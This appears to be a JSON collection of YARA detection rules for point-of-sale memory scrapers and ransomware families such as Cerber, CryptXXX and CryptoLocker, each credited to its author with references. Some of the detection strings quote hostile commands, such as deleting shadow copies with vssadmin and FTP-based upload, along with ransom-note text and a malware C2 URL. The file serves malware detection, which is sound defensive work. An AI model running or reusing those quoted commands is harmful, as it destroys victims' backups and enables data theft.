  "monitor_tool_pos": "rule monitor_tool_pos\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\treference = \"POS malware - Monitoring Tool??\"\nstrings:\n\t$s1 = \"RCPT TO\"\n\t$s2 = \"MAIL FROM\"\n\t$s3 = \"AUTH LOGIN\"\n\t$s4 = \"Reply-To\"\n\t$s5 = \"X-Mailer\"\n\t$s6 = \"crypto\"\n\t$s7 = \"test335.txt\" wide\n\t$s8 = \"/c del\"\ncondition:\n\tuint16(0) == 0x5A4D and 7 of ($s*)\n}",
  "pstgdump": "rule pstgdump\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\treference = \"pstgdump\"\nstrings:\n\t$s1 = \"fgdump\\\\pstgdump\"\n\t$s2 = \"pstgdump\"\n\t$s3 = \"Outlook\"\ncondition:\n\tuint16(0) == 0x5A4D and all of ($s*)\n}",
  "keyfinder_tool": "rule keyfinder_tool\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\treference = \"Magical Jelly Bean KeyFinder\"\nstrings:\n\t$s1 = \"chgxp.vbs\"\n\t$s2 = \"officekey.exe\"\n\t$s3 = \"findkey.exe\"\n\t$s4 = \"xpkey.exe\"\ncondition:\n\tuint16(0) == 0x5A4D and 2 of ($s*)\n}",
  "memdump_diablo": "rule memdump_diablo\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\treference = \"Process Memory Dumper - DiabloHorn\"\nstrings:\n\t$s1 = \"DiabloHorn\"\n\t$s2 = \"Process Memory Dumper\"\n\t$s3 = \"pid-%s.dmp\"\n\t$s4 = \"Pid %d in not acessible\" // SIC\n\t$s5 = \"memdump.exe\"\n\t$s6 = \"%s-%d.dmp\"\ncondition:\n\tuint16(0) == 0x5A4D and 3 of ($s*)\n}",
  "blazingtools": "rule blazingtools\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\treference = \"Blazing Tools - http://www.blazingtools.com (Keyloggers)\"\nstrings:\n\t$s1 = \"blazingtools.com\"\n\t$s2 = \"Keystrokes\" wide\n\t$s3 = \"Screenshots\" wide\ncondition:\n\tuint16(0) == 0x5A4D and all of ($s*)\n}",
  "sysocmgr": "rule sysocmgr\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\treference = \"System stand-alone Optional Component Manager - http://support.microsoft.com/kb/222444\"\nstrings:\n\t$s1 = \"SYSOCMGR.EXE\" wide\n\t$s2 = \"System stand-alone Optional Component Manager\" wide\ncondition:\n\tuint16(0) == 0x5A4D and all of ($s*)\n}",
  "lacy_keylogger": "rule lacy_keylogger\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\treference = \"Appears to be a form of keylogger.\"\nstrings:\n\t$s1 = \"Lacy.exe\" wide\n\t$s2 = \"Bldg Chive Duel Rip Query\" wide\ncondition:\n\tuint16(0) == 0x5A4D and all of ($s*)\n}",
  "searchinject": "rule searchinject\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\treference = \"Usage: SearchInject <PID1>[PID2][PID3] - It loads Searcher.dll (appears to be hard coded)\"\nstrings:\n\t$s1 = \"SearchInject\"\n\t$s2 = \"inject base:\"\n\t$s3 = \"Searcher.dll\" nocase\ncondition:\n\tuint16(0) == 0x5A4D and all of ($s*)\n}",
  "heistenberg_pos": "rule heistenberg_pos\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\treference = \"POS Malware\"\nstrings:\n\t$s1 = \"KARTOXA\"\n\t$s2 = \"dmpz.log\"\n\t$s3 = \"/api/process.php?xy=\"\n\t$s4 = \"User-Agent: PCICompliant\" // PCICompliant/3.33\n\t$s6 = \"%s:*:Enabled:%s\"\ncondition:\n\tuint16(0) == 0x5A4D and 3 of ($s*)\n}",
  "pos_jack": "rule pos_jack\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\tmaltype = \"Point of Sale (POS) Malware\"\n\tversion = \"0.1\"\n\treference = \"http://blog.spiderlabs.com/2014/02/jackpos-the-house-always-wins.html\"\n\tdate = \"2/22/2014\"\nstrings:\n\t$pdb1 = \"\\\\ziedpirate.ziedpirate-PC\\\\\"\n\t$pdb2 = \"\\\\sop\\\\sop\\\\\"\ncondition:\n\tuint16(0) == 0x5A4D and 1 of ($pdb*)\n}",
  "pos_memory_scrapper_": "rule pos_memory_scrapper_\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\tmaltype = \"Point of Sale (POS) Malware Memory Scraper\"\n\tversion = \"0.3\"\n\tdescription = \"POS Memory Scraper\"\n\tdate = \"01/30/2014\"\nstrings:\n\t$s1 = \"kartoxa\" nocase\n\t$s2 = \"CC2 region:\"\n\t$s3 = \"CC memregion:\"\n\t$s4 = \"target pid:\"\n\t$s5 = \"scan all processes:\"\n\t$s6 = \"<pid> <PATTERN>\"\n\t$s7 = \"KAPTOXA\"\n\t$s8 = \"ATTERN\"\n\t$s9 = \"\\\\svhst%p\"\ncondition:\n\tuint16(0) == 0x5A4D and 3 of ($s*)\n}",
  "pos_malwre_dexter_stardust": "rule pos_malwre_dexter_stardust\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\tmaltype = \"Dexter Malware - StarDust Variant\"\n\tversion = \"0.1\"\n\tdescription = \"Table 2 arbornetworks.com/asert/wp-content/uploads/2013/12/Dexter-and-Project-Hook-Break-the-Bank.pdf\"\n\treference = \"16b596de4c0e4d2acdfdd6632c80c070, 2afaa709ef5260184cbda8b521b076e1, and e3dd1dc82ddcfaf410372ae7e6b2f658\"\n\tdate = \"12/30/2013\"\nstrings:\n\t$s1 = \"ceh_3\\\\.\\\\ceh_4\\\\..\\\\ceh_6\"\n\t$s2 = \"Yatoed3fe3rex23030am39497403\"\n\t$s3 = \"Poo7lo276670173quai16568unto1828Oleo9eds96006nosysump7hove19\"\n\t$s4 = \"CommonFile.exe\"\ncondition:\n\tuint16(0) == 0x5A4D and all of ($s*)\n}",
  "pos_malware_project_hook": "rule pos_malware_project_hook\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\tmaltype = \"Project Hook\"\n\tversion = \"0.1\"\n\tdescription = \"Table 1 arbornetworks.com/asert/wp-content/uploads/2013/12/Dexter-and-Project-Hook-Break-the-Bank.pdf\"\n\treference = \"759154d20849a25315c4970fe37eac59\"\n\tdate = \"12/30/2013\"\nstrings:\n\t$s1 = \"CallImage.exe\"\n\t$s2 = \"BurpSwim\"\n\t$s3 = \"Work\\\\Project\\\\Load\"\n\t$s4 = \"WortHisnal\"\ncondition:\n\tuint16(0) == 0x5A4D and all of ($s*)\n}",
  "pdb_strings_Rescator": "rule pdb_strings_Rescator\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\tmaltype = \"Target Attack\"\n\tversion = \"0.3\"\n\tdescription = \"Rescator PDB strings within binaries\"\n\tdate = \"01/30/2014\"\nstrings:\n\t$pdb1 = \"\\\\Projects\\\\Rescator\" nocase\ncondition:\n\tuint16(0) == 0x5A4D and $pdb1\n}",
  "pos_uploader": "rule pos_uploader\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\tmaltype = \"Point of Sale (POS) Malware\"\n    reference = \"http://blogs.mcafee.com/mcafee-labs/analyzing-the-target-point-of-sale-malware\"\n\tversion = \"0.1\"\n\tdescription = \"Testing the base64 encoded file in sys32\"\n\tdate = \"01/30/2014\"\nstrings:\n\t$s1 = \"cmd /c net start %s\"\n\t$s2 = \"ftp -s:%s\"\n\t$s3 = \"data_%d_%d_%d_%d_%d.txt\"\n\t$s4 = \"\\\\uploader\\\\\"\ncondition:\n\tuint16(0) == 0x5A4D and all of ($s*)\n}",
  "winxml_dll": "rule winxml_dll\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\tmaltype = \"Point of Sale (POS) Malware\"\n    reference = \"ce0296e2d77ec3bb112e270fc260f274\"\n\tversion = \"0.1\"\n\tdescription = \"Testing the base64 encoded file in sys32\"\n\tdate = \"01/30/2014\"\nstrings:\n\t$s1 = \"\\\\system32\\\\winxml.dll\"\n\t//$s2 = \"cmd /c net start %s\"\n\t//$s3 = \"=== pid:\"\n\t//$s4 = \"GOTIT\"\n\t//$s5 = \".memdump\"\n\t//$s6 = \"POSWDS\"\ncondition:\n\tuint16(0) == 0x5A4D and (all of ($s*))\n}",
  "pos_chewbacca": "rule pos_chewbacca\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\tmaltype = \"Point of Sale (POS) Malware\"\n    reference = \"https://www.securelist.com/en/blog/208214185/ChewBacca_a_new_episode_of_Tor_based_Malware\"\n    hashes = \"21f8b9d9a6fa3a0cd3a3f0644636bf09, 28bc48ac4a92bde15945afc0cee0bd54\"\n\tversion = \"0.2\"\n\tdescription = \"Testing the base64 encoded file in sys32\"\n\tdate = \"01/30/2014\"\nstrings:\n\t$s1 = \"tor -f <torrc>\"\n\t$s2 = \"tor_\"\n\t$s3 = \"umemscan\"\n\t$s4 = \"CHEWBAC\"\ncondition:\n\tuint16(0) == 0x5A4D and (all of ($s*))\n}",
  "BernhardPOS": "rule BernhardPOS {\n     meta:\n          author = \"Nick Hoffman / Jeremy Humble\"\n          last_update = \"2015-07-14\"\n          source = \"Morphick Inc.\"\n          description = \"BernhardPOS Credit Card dumping tool\"\n          reference = \"http://morphick.com/blog/2015/7/14/bernhardpos-new-pos-malware-discovered-by-morphick\"\n          md5 = \"e49820ef02ba5308ff84e4c8c12e7c3d\"\n          score = 70\n     strings:\n          $shellcode_kernel32_with_junk_code = { 33 c0 83 ?? ?? 83 ?? ?? 64 a1 30 00 00 00 83 ?? ?? 83 ?? ?? 8b 40 0c 83 ?? ?? 83 ?? ?? 8b 40 14 83 ?? ?? 83 ?? ?? 8b 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 8b 00 83 ?? ?? 83 ?? ?? 8b 40 10 83 ?? ?? }\n          $mutex_name = \"OPSEC_BERNHARD\" \n          $build_path = \"C:\\\\bernhard\\\\Debug\\\\bernhard.pdb\" \n          $string_decode_routine = { 55 8b ec 83 ec 50 53 56 57 a1 ?? ?? ?? ?? 89 45 f8 66 8b 0d ?? ?? ?? ?? 66 89 4d fc 8a 15 ?? ?? ?? ?? 88 55 fe 8d 45 f8 50 ff ?? ?? ?? ?? ?? 89 45 f0 c7 45 f4 00 00 00 00 ?? ?? 8b 45 f4 83 c0 01 89 45 f4 8b 45 08 50 ff ?? ?? ?? ?? ?? 39 45 f4 ?? ?? 8b 45 08 03 45 f4 0f be 08 8b 45 f4 99 f7 7d f0 0f be 54 15 f8 33 ca 8b 45 08 03 45 f4 88 08 ?? ?? 5f 5e 5b 8b e5 5d }\n     condition:\n          any of them\n }",
  "POS_bruteforcing_bot": "rule POS_bruteforcing_bot\n{ \n\tmeta:\n\t\tmaltype = \"botnet\"\n    ref = \"https://github.com/reed1713\"\n\t\treference = \"http://www.alienvault.com/open-threat-exchange/blog/botnet-bruteforcing-point-of-sale-via-remote-desktop\"\n\t\tdate = \"3/11/2014\"\n\t\tdescription = \"botnet bruteforcing POS terms via RDP\"\n\tstrings:\n\t\t$type=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid=\"4688\"\n\t\t$data=\"\\\\AppData\\\\Roaming\\\\lsacs.exe\"\n\n\tcondition:\n\t\tall of them\n}",
  "easterjackpos": "rule easterjackpos {\n    meta:\n        author = \"Brian Wallace @botnet_hunter\"\n        author_email = \"bwall@ballastsecurity.net\"\n        date = \"2014-09-02\"\n        description = \"Identify JackPOS\"\n\tstrings:\n\t    $s1 = \"updateinterval=\"\n        $s2 = \"cardinterval=\"\n        $s3 = \"{[!17!]}{[!18!]}\"\n    condition:\n        all of them\n}",
  "LogPOS": "rule LogPOS\n{\n    meta:\n        author = \"Morphick Security\"\n        description = \"Detects Versions of LogPOS\"\n        md5 = \"af13e7583ed1b27c4ae219e344a37e2b\"\n    strings:\n        $mailslot = \"\\\\\\\\.\\\\mailslot\\\\LogCC\"\n        $get = \"GET /%s?encoding=%c&t=%c&cc=%I64d&process=\"\n        //64A130000000      mov eax, dword ptr fs:[0x30]\n        //8B400C        mov eax, dword ptr [eax + 0xc]\n        //8B401C        mov eax, dword ptr [eax + 0x1c]\n        //8B4008        mov eax, dword ptr [eax + 8]\n        $sc = {64 A1 30 00 00 00 8B 40 0C 8B 40 1C 8B 40 08 }\n    condition:\n        $sc and 1 of ($mailslot,$get)\n}",
  "PoS_Malware_MalumPOS": "rule PoS_Malware_MalumPOS\n{\n    meta:\n        author = \"Trend Micro, Inc.\"\n        date = \"2015-05-25\"\n        description = \"Used to detect MalumPOS memory dumper\"\n        sample_filtype = \"exe\"\n    strings:\n        $string1 = \"SOFTWARE\\\\Borland\\\\Delphi\\\\RTL\"\n        $string2 = \"B)[0-9]{13,19}\\\\\"\n        $string3 = \"[A-Za-z\\\\s]{0,30}\\\\/[A-Za-z\\\\s]{0,30}\\\\\"\n        $string4 = \"TRegExpr(exec): ExecNext Without Exec[Pos]\"\n        $string5 = /Y:\\\\PROGRAMS\\\\.{20,300}\\.pas/ \n    condition:\n        all of ($string*)\n}",
  "Mozart": "rule Mozart\n{\n   meta:\n       author = \"Nick Hoffman - Morphick Inc\"\n       description = \"Detects samples of the Mozart POS RAM scraping utility\"\n       reference = \"http://securitykitten.github.io/the-mozart-ram-scraper/\"\n   strings:\n       $pdb = \"z:\\\\Slender\\\\mozart\\\\mozart\\\\Release\\\\mozart.pdb\" nocase wide ascii\n       $output = {67 61 72 62 61 67 65 2E 74 6D 70 00}\n       $service_name = \"NCR SelfServ Platform Remote Monitor\" nocase wide ascii\n       $service_name_short = \"NCR_RemoteMonitor\"\n       $encode_data = {B8 08 10 00 00 E8 ?? ?? ?? ?? A1 ?? ?? ?? ?? 53 55 8B AC 24 14 10 00 00 89 84 24 0C 10 00 00 56 8B C5 33 F6 33 DB 8D 50 01 8D A4 24 00 00 00 00 8A 08 40 84 C9 ?? ?? 2B C2 89 44 24 0C ?? ?? 8B 94 24 1C 10 00 00 57 8B FD 2B FA 89 7C 24 10 ?? ?? 8B 7C 24 10 8A 04 17 02 86 E0 BA 40 00 88 02 B8 ?? ?? ?? ?? 46 8D 78 01 8D A4 24 00 00 00 00 8A 08 40 84 C9 ?? ?? 2B C7 3B F0 ?? ?? 33 F6 8B C5 43 42 8D 78 01 8A 08 40 84 C9 ?? ?? 2B C7 3B D8 ?? ?? 5F 8B B4 24 1C 10 00 00 8B C5 C6 04 33 00 8D 50 01 8A 08 40 84 C9 ?? ?? 8B 8C 24 20 10 00 00 2B C2 51 8D 54 24 14 52 50 56 E8 ?? ?? ?? ?? 83 C4 10 8B D6 5E 8D 44 24 0C 8B C8 5D 2B D1 5B 8A 08 88 0C 02 40 84 C9 ?? ?? 8B 8C 24 04 10 00 00 E8 ?? ?? ?? ?? 81 C4 08 10 00 00}\n   condition:\n      any of ($pdb, $output, $encode_data) or\n      all of ($service*)\n}",
  "Ransom_CryptXXX_Dropper": "rule Ransom_CryptXXX_Dropper\n{\n    /*\n      Regla para detectar el dropper de Ransom.CryptXXX con MD5 d01fd2bb8c6296d51be297978af8b3a1\n    */\n    meta:\n        description = \"Regla para detectar RANSOM.CRYPTXXX\"\n        author      = \"CCN-CERT\"\n        version     = \"1.0\"\n        ref = \"https://www.ccn-cert.cni.es/seguridad-al-dia/comunicados-ccn-cert/4002-publicado-el-informe-del-codigo-danino-ransom-cryptxxx.html\"\n    strings:\n        $a = { 50 65 31 57 58 43 46 76 59 62 48 6F 35 }\n        $b = { 43 00 3A 00 5C 00 42 00 49 00 45 00 52 00 5C 00 51 00 6D 00 6B 00 4E 00 52 00 4C 00 46 00 00 }\n    condition:\n        all of them\n}",
  "Ransom_CryptXXX_Real": "rule Ransom_CryptXXX_Real\n{\n    /*\n      Regla para detectar el codigo Ransom.CryptXXX fuera del dropper con MD5 ae06248ab3c02e1c2ca9d53b9a155199\n    */\n    meta:\n        description = \"Regla para detectar Ransom.CryptXXX original\"\n        author      = \"CCN-CERT\"\n        version     = \"1.0\"\n        ref = \"https://www.ccn-cert.cni.es/seguridad-al-dia/comunicados-ccn-cert/4002-publicado-el-informe-del-codigo-danino-ransom-cryptxxx.html\"\n    strings:\n        $a = { 52 59 47 40 4A 41 59 5D 52 00 00 00 FF FF FF FF }\n\t\t$b = { 06 00 00 00 52 59 47 40 40 5A 00 00 FF FF FF FF }\n\t\t$c = { 0A 00 00 00 52 5C 4B 4D 57 4D 42 4B 5C 52 00 00 }\n\t\t$d = { FF FF FF FF 0A 00 00 00 52 5D 57 5D 5A 4B 43 70 }\n\t\t$e = { 3F 52 00 00 FF FF FF FF 06 00 00 00 52 4C 41 41 }\n\t\t$f = { 5A 52 00 00 FF FF FF FF 0A 00 00 00 52 5C 4B 4D }\n\t\t$g = { 41 58 4B 5C 57 52 00 00 FF FF FF FF 0E 00 00 00 }\n\t\t$h = { 52 2A 5C 4B 4D 57 4D 42 4B 20 4C 47 40 52 00 00 }\n\t\t$i = { FF FF FF FF 0A 00 00 00 52 5E 4B 5C 48 42 41 49 }\n\t\t$j = { 5D 52 00 00 FF FF FF FF 05 00 00 00 52 4B 48 47 }\n\t\t$k = { 52 00 00 00 FF FF FF FF 0C 00 00 00 52 4D 41 40 }\n\t\t$l = { 48 47 49 20 43 5D 47 52 00 00 00 00 FF FF FF FF }\n\t\t$m = { 0A 00 00 00 52 5E 5C 41 49 5C 4F 70 3F 52 00 00 }\n\t\t$n = { FF FF FF FF 0A 00 00 00 52 5E 5C 41 49 5C 4F 70 }\n\t\t$o = { 3C 52 00 00 FF FF FF FF 08 00 00 00 52 49 41 41 }\n\t\t$p = { 49 42 4B 52 00 00 00 00 FF FF FF FF 06 00 00 00 }\n\t\t$q = { 52 5A 4B 43 5E 52 00 00 FF FF FF FF 08 00 00 00 }\n\t\t$v = { 52 48 3A 4C 4D 70 3F 52 00 00 00 00 FF FF FF FF }\n\t\t$w = { 0A 00 00 00 52 4F 42 42 5B 5D 4B 70 3F 52 00 00 }\n\t\t$x = { FF FF FF FF 0A 00 00 00 52 5E 5C 41 49 5C 4F 70 }\n\t\t$y = { 3F 52 00 00 FF FF FF FF 0A 00 00 00 52 5E 5C 41 }\n\t\t$z = { 49 5C 4F 70 3C 52 00 00 FF FF FF FF 09 00 00 00 }\n\t\t$aa = { 52 4F 5E 5E 4A 4F 5A 4F 52 00 00 00 FF FF FF FF }\n\t\t$ab = { 0A 00 00 00 52 5E 5C 41 49 5C 4F 70 3D 52 00 00 }\n\t\t$ac = { FF FF FF FF 08 00 00 00 52 5E 5B 4C 42 47 4D 52 }\n\t\t\n    condition:\n        all of them\n}",
  "legion_777": "rule legion_777\n{\n    meta:\n        author = \"Daxda (https://github.com/Daxda)\"\n        date = \"2016/6/6\"\n        description = \"Detects an UPX-unpacked .777 ransomware binary.\"\n        ref = \"https://github.com/Daxda/malware-analysis/tree/master/malware_samples/legion\"\n        category = \"Ransomware\"\n        sample = \"SHA256: 14d22359e76cf63bf17268cad24bac03663c8b2b8028b869f5cec10fe3f75548\"\n\n    strings:\n        $s1 = \"http://tuginsaat.com/wp-content/themes/twentythirteen/stats.php\"\n        $s2 = \"read_this_file.txt\" wide // Ransom note filename.\n        $s3 = \"seven_legion@india.com\" // Part of the format string used to rename files.\n        $s4 = {46 4f 52 20 44 45 43 52 59 50 54 20 46 49 4c 45 53 0d 0a 53 45 4e 44 20 4f\n               4e 45 20 46 49 4c 45 20 49 4e 20 45 2d 4d 41 49 4c 0d 0a 73 65 76 65 6e 5f\n               6c 65 67 69 6f 6e 40 69 6e 64 69 61 2e 63 6f 6d } // Ransom note content.\n        $s5 = \"%s._%02i-%02i-%02i-%02i-%02i-%02i_$%s$.777\" // Renaming format string.\n\n    condition:\n        4 of ($s*)\n}",
  "Ransom_Alpha": "rule Ransom_Alpha\n{\nmeta:\ndescription = \"Regla para detectar Ransom.Alpha (posibles falsos positivos)\"\nauthor = \"CCN-CERT\"\nversion = \"1.0\"\nstrings:\n$a = { 52 00 65 00 61 00 64 00 20 00 4D 00 65 00 20 00 28 00 48 00 6F 00 77 00 20 00 44 00 65 00 63 }\ncondition:\n$a\n}",
  "Ransom_Alfa": "rule Ransom_Alfa\n{\nmeta:\ndescription = \"Regla para detectar W32/Filecoder.Alfa (Posibles falsos positivos)\"\nauthor = \"CCN-CERT\"\nversion = \"1.0\"\nstrings:\n$a = { 8B 0C 97 81 E1 FF FF 00 00 81 F9 19 04 00 00 74 0F 81 F9 } \n$b = { 22 04 00 00 74 07 42 3B D0 7C E2 EB 02 }\ncondition:\nall of them\n}",
  "cerber3": "rule cerber3{\nmeta:\n  author = \"pekeinfo\"\n  date = \"2016-09-09\"\n  description = \"Cerber3 \"\nstrings:\n  $a = {00 6A 00 68 80 00 00 00 6A 03 6A 00 6A 03 6A  01 8B 85}\n  $b = {68 3B DB 00 00 ?? ?? ?? ?? 00 ?? FF 15}\n  \ncondition:\n  1 of them \n}",
  "cerber4": "rule cerber4{\nmeta:\n        author = \"pekeinfo\"\n        date = \"2016-09-09\"\n        description = \"Cerber4\"\nstrings:\n        $a = {8B 0D ?? ?? 43 00 51 8B 15 ?? ?? 43 00 52 E8 C9 04 00 00 83 C4 08 89 45 FC A1 ?? ?? 43 00 3B 05 ?? ?? 43 00 72 02}\n\ncondition:\n        1 of them \n}",
  "cerber5": "rule cerber5{\nmeta:\n  author = \"pekeinfo\"\n  date = \"2016-12-02\"\n  description = \"Cerber5\"\nstrings:\n  $a = {83 C4 04 A3 ?? ?? ?? 00 C7 45 ?? ?? ?? ?? 00 8B ?? ?? C6 0? 56 8B ?? ?? 5? 68 ?? ?? 4? 00 FF 15 ?? ?? 4? 00 50 FF 15 ?? ?? 4? 00 A3 ?? ?? 4? 00 68 1D 10 00 00 E8 ?? ?? FF FF 83 C4 04 ?? ?? ??}\n  \ncondition:\n  1 of them \n}",
  "cerber5b": "rule cerber5b{\nmeta:\n  author = \"pekeinfo\"\n  date = \"2016-12-20\"\n  description = \"Cerber5b\"\nstrings:\n  $a={8B ?? ?8 ?? 4? 00 83 E? 02 89 ?? ?8 ?? 4? 00 68 ?C ?9 4? 00 [0-6] ?? ?? ?? ?? ?? ?8 ?? 4? 00 5? FF 15 ?? ?9 4? 00 89 45 ?4 83 7D ?4 00 75 02 EB 12 8B ?? ?0 83 C? 06 89 ?? ?0 B? DD 03 00 00 85}  \ncondition:\n  $a\n}",
  "ransom_comodosec_mrcr1": "rule ransom_comodosec_mrcr1 {\n\n        meta:\n                author = \" J from THL <j@techhelplist.com>\"\n                date = \"2017/01\"\n                reference = \"https://virustotal.com/en/file/75c82fd18fcf8a51bc1b32a89852d90978fa5e7a55281f42b0a1de98d14644fa/analysis/\"\n                version = 1\n                maltype = \"Ransomware\"\n                filetype = \"memory\"\n\n        strings:\n                $text01 = \"WebKitFormBoundary\"\n                $text02 = \"Start NetworkScan\"\n                $text03 = \"Start DriveScan\"\n                $text04 = \"Start CryptFiles\"\n                $text05 = \"cmd /c vssadmin delete shadows /all /quiet\"\n                $text06 = \"isAutorun:\"\n                $text07 = \"isNetworkScan:\"\n                $text08 = \"isUserDataLast:\"\n                $text09 = \"isCryptFileNames:\"\n                $text10 = \"isChangeFileExts:\"\n                $text11 = \"isPowerOffWindows:\"\n                $text12 = \"GatePath:\"\n                $text13 = \"GatePort:\"\n                $text14 = \"DefaultCryptKey:\"\n                $text15 = \"UserAgent:\"\n                $text16 = \"Mozilla_\"\n                $text17 = \"On Error Resume Next\"\n                $text18 = \"Content-Disposition: form-data; name=\\\"uid\\\"\"\n                $text19 = \"Content-Disposition: form-data; name=\\\"uname\\\"\"\n                $text20 = \"Content-Disposition: form-data; name=\\\"cname\\\"\"\n                $regx21 = /\\|[0-9a-z]{2,5}\\|\\|[0-9a-z]{2,5}\\|\\|[0-9a-z]{2,5}\\|\\|[0-9a-z]{2,5}\\|/\n\n\n    condition:\n        10 of them\n}",
  "Ransom": "rule Ransom : Crypren{\n    meta:\n        weight = 1\n        Author = \"@pekeinfo\"\n        reference = \"https://github.com/pekeinfo/DecryptCrypren\"\n    strings: \n        $a = \"won't be able to recover your files anymore.</p>\"\n        $b = {6A 03 68 ?? ?? ?? ?? B9 74 F1 AE 00 E8 ?? ?? ?? ?? E8 ?? ?? ?? ?? 68 98 3A 00 00 FF D6 6A 00 68 ?? ?? ?? ?? 68 ?? ?? ?? ??}\n        $c = \"Please restart your computer and wait for instructions for decrypting your files\"\n    condition:\n        any of them\n}",
  "cryptonar_ransomware": "rule cryptonar_ransomware {\n\n   meta:\n   \n      description = \"Rule to detect CryptoNar Ransomware\"\n      author = \"Marc Rivero | @seifreed\"\n      reference = \"https://www.bleepingcomputer.com/news/security/cryptonar-ransomware-discovered-and-quickly-decrypted/\"\n      \n   strings:\n   \n      $s1 = \"C:\\\\narnar\\\\CryptoNar\\\\CryptoNarDecryptor\\\\obj\\\\Debug\\\\CryptoNar.pdb\" fullword ascii\n      $s2 = \"CryptoNarDecryptor.exe\" fullword wide\n      $s3 = \"server will eliminate the key after 72 hours since its generation (since the moment your computer was infected). Once this has \" fullword ascii\n      $s4 = \"Do not delete this file, else the decryption process will be broken\" fullword wide\n      $s5 = \"key you received, and wait until the decryption process is done.\" fullword ascii\n      $s6 = \"In order to receive your decryption key, you will have to pay $200 in bitcoins to this bitcoin address: [bitcoin address]\" fullword ascii\n      $s7 = \"Decryption process failed\" fullword wide\n      $s8 = \"CryptoNarDecryptor.KeyValidationWindow.resources\" fullword ascii\n      $s9 = \"Important note: Removing CryptoNar will not restore access to your encrypted files.\" fullword ascii\n      $s10 = \"johnsmith987654@tutanota.com\" fullword wide\n      $s11 = \"Decryption process will start soon\" fullword wide\n      $s12 = \"CryptoNarDecryptor.DecryptionProgressBarForm.resources\" fullword ascii\n      $s13 = \"DecryptionProcessProgressBar\" fullword wide\n      $s14 = \"CryptoNarDecryptor.Properties.Resources.resources\" fullword ascii\n      \n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 2000KB) and all of them \n}",
  "CryptoLocker_set1": "rule CryptoLocker_set1\n{\nmeta:\n\tauthor = \"Christiaan Beek, Christiaan_Beek@McAfee.com\"\n\tdate = \"2014-04-13\"\n\tdescription = \"Detection of Cryptolocker Samples\"\n\t\nstrings:\n\t$string0 = \"static\"\n\t$string1 = \" kscdS\"\n\t$string2 = \"Romantic\"\n\t$string3 = \"CompanyName\" wide\n\t$string4 = \"ProductVersion\" wide\n\t$string5 = \"9%9R9f9q9\"\n\t$string6 = \"IDR_VERSION1\" wide\n\t$string7 = \"  </trustInfo>\"\n\t$string8 = \"LookFor\" wide\n\t$string9 = \":n;t;y;\"\n\t$string10 = \"        <requestedExecutionLevel level\"\n\t$string11 = \"VS_VERSION_INFO\" wide\n\t$string12 = \"2.0.1.0\" wide\n\t$string13 = \"<assembly xmlns\"\n\t$string14 = \"  <trustInfo xmlns\"\n\t$string15 = \"srtWd@@\"\n\t$string16 = \"515]5z5\"\n\t$string17 = \"C:\\\\lZbvnoVe.exe\" wide\ncondition:\n\t12 of ($string*)\n}",
  "CryptoLocker_rule2": "rule CryptoLocker_rule2\n{\nmeta:\n\tauthor = \"Christiaan Beek, Christiaan_Beek@McAfee.com\"\n\tdate = \"2014-04-14\"\n\tdescription = \"Detection of CryptoLocker Variants\"\nstrings:\n\t$string0 = \"2.0.1.7\" wide\n\t$string1 = \"    <security>\"\n\t$string2 = \"Romantic\"\n\t$string3 = \"ProductVersion\" wide\n\t$string4 = \"9%9R9f9q9\"\n\t$string5 = \"IDR_VERSION1\" wide\n\t$string6 = \"button\"\n\t$string7 = \"    </security>\"\n\t$string8 = \"VFileInfo\" wide\n\t$string9 = \"LookFor\" wide\n\t$string10 = \"      </requestedPrivileges>\"\n\t$string11 = \" uiAccess\"\n\t$string12 = \"  <trustInfo xmlns\"\n\t$string13 = \"last.inf\"\n\t$string14 = \" manifestVersion\"\n\t$string15 = \"FFFF04E3\" wide\n\t$string16 = \"3,31363H3P3m3u3z3\"\ncondition:\n\t12 of ($string*)\n}",
  "SVG_LoadURL": "rule SVG_LoadURL {\n\tmeta:\n\t\tdescription = \"Detects a tiny SVG file that loads an URL (as seen in CryptoWall malware infections)\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://goo.gl/psjCCc\"\n\t\tdate = \"2015-05-24\"\n\t\thash1 = \"ac8ef9df208f624be9c7e7804de55318\"\n\t\thash2 = \"3b9e67a38569ebe8202ac90ad60c52e0\"\n\t\thash3 = \"7e2be5cc785ef7711282cea8980b9fee\"\n\t\thash4 = \"4e2c6f6b3907ec882596024e55c2b58b\"\n\t\tscore = 50\n\tstrings:\n\t\t$s1 = \"</svg>\" nocase\n\t\t$s2 = \"<script>\" nocase\n\t\t$s3 = \"location.href='http\" nocase\n\tcondition:\n\t\tall of ($s*) and filesize < 600\n}",
  "BackdoorFCKG": "rule BackdoorFCKG: CTB_Locker_Ransomware\n{\nmeta:\nauthor = \"ISG\"\ndate = \"2015-01-20\"\nreference = \"https://blogs.mcafee.com/mcafee-labs/rise-backdoor-fckq-ctb-locker\"\ndescription = \"CTB_Locker\"\n\nstrings:\n$string0 = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n$stringl = \"RNDBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" \n$string2 = \"keme132.DLL\" \n$string3 = \"klospad.pdb\" \ncondition:\n3 of them \n}",
